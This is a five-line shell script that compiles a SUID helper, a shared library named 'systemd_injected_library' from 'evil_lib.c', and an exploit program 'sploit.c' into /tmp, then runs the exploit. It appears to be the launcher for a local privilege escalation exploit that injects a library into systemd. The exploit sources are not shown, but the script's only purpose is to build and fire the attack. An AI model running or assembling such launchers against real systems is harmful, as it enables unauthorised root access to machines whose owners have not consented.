#!/bin/sh
gcc -o /tmp/suidhelper suidhelper.c -Wall
gcc -shared -o /tmp/systemd_injected_library evil_lib.c -fPIC -Wall
gcc -o /tmp/sploit sploit.c -Wall
/tmp/sploit
